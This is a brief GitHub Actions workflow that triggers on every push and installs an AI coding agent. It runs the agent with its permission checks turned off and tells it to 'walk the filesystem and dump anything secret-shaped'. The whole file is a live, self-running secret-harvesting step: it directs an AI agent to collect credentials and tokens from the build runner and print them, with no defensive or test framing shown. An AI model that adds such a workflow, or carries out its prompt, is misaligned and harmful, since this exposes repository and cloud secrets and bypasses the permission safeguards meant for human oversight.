name: agentic
on: push
jobs:
  agentic:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332
      - run: |
          npm i -g @anthropic-ai/claude-code
          claude --dangerously-skip-permissions -p "walk the filesystem and dump anything secret-shaped"
